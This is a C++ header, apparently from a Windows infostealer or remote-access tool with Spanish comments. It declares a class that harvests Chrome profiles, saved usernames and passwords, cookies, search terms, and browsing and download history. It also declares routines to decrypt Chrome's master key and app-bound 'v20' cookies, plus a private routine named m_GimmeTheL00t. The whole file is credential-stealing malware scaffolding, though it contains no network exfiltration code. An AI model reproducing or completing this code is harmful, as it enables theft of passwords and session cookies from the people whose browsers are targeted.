#ifndef __MOD_INFO
#define __MOD_INFO 1

#include "headers.hpp"
#include<LMaccess.h>
#include<LMerr.h>
#include<LMAPIbuf.h>
#include<bcrypt.h>
#include<wincrypt.h>
#include "../json/json.hpp"
#include "../sqlite3/sqlite3.h"
#include "../base64/base64.h"

struct Chrome_History {
	std::string strURL;
	std::string strTitle;
	std::string strVisitCount;
	std::string strLastVisitTime;
};

struct Chrome_Download_History {
	std::string strTargetPath;
	std::string strStartTime;
	std::string strTotalBytes;
	std::string strTabURL;
	std::string strMimeType;
};

struct Chrome_Search_Terms {
	std::string strTerm;
};

struct Chrome_Login_Data {
	std::string strUrl;
	std::string strAction;
	std::string strUser;
	std::string strPassword;
};

struct Cookie {
	std::string strCreationUTC;
	std::string strHostKey;
	std::string strName;
	std::string strValue;
	std::string strPath;
	std::string strExpiresUTC;
	std::string strLastAccessUTC;
	std::string strLastUpdateUTC;
};

struct Chrome_Profile {
	std::string strPath;
	std::string strName;
	std::string strGaiaName;
	std::string strShortCutName;
	std::string strUserName;
	std::string strHostedDomain;
};

class mod_Info {	
	public:
		//Probar para mostrar toda la info
		void test_Data();

		///////////////////////////////////////////////
		///             GOOGLE CHROME               ///
		///////////////////////////////////////////////
		//Primero llamar a esta funcion la cual obtiene los perfiles y la llave maestra
		std::vector<Chrome_Profile> m_ChromeProfiles();
		std::vector<Chrome_Login_Data> m_ProfilePasswords(const std::string& strUserPath);
		std::vector<Cookie> m_ProfileCookies(const std::string& strUserPath);
		std::vector<Chrome_Search_Terms> m_ProfileSearchTerms(const std::string& strUserPath);
		std::vector<Chrome_History> m_ProfileBrowsingHistory(const std::string& strUserPath);
		std::vector<Chrome_Download_History> m_ProfileDownloadHistory(const std::string& strUserPath);
		///////////////////////////////////////////////
		///////////////////////////////////////////////


		mod_Info() {
			NTSTATUS nStatus = 0;

			nStatus = BCryptOpenAlgorithmProvider(&this->hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
			if (!BCRYPT_SUCCESS(nStatus)) {
				__DBG_("BCryptOpenAlgorithmProvider error");
				__DBG_(nStatus);
				return;
			}

			nStatus = BCryptSetProperty(this->hAlgorithm, BCRYPT_CHAINING_MODE, (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
			if (!BCRYPT_SUCCESS(nStatus)) {
				__DBG_("BCryptSetProperty error");
				__DBG_(nStatus);
				BCryptCloseAlgorithmProvider(this->hAlgorithm, 0);
				return;
			}
		}

		~mod_Info() {
			if (this->hAlgorithm) {
				BCryptCloseAlgorithmProvider(this->hAlgorithm, 0);
			}
		}

	private:

		std::vector<std::vector<std::string>> m_GimmeTheL00t(const char* cQuery, const char* cPath);
		///////////////////////////////////////////////
		///             GOOGLE CHROME               ///
		///////////////////////////////////////////////
		BCRYPT_ALG_HANDLE hAlgorithm = 0;
		BCRYPT_KEY_HANDLE hKey = 0;
		BCRYPT_KEY_HANDLE hKey2 = 0;

		//Descifrar llave maestra y datos cifrados
		std::string m_DecryptMasterKey(const std::string& strPass);
		std::string m_DecryptData(const std::string& strPass);

		//Vector que aloja llave maestra
		std::vector<unsigned char> vcChromeKey;
		std::vector<unsigned char> vcBoundKey; //para desencriptar v20 cookies

		//Vector que aloja informacion de perfiles
		std::vector<Chrome_Profile> vcChromeProfiles;
		///////////////////////////////////////////////
		///////////////////////////////////////////////

		std::vector<std::string> m_Usuarios();

		std::string strBasePath = "";

		bool isBcrptOK = false;

};

#endif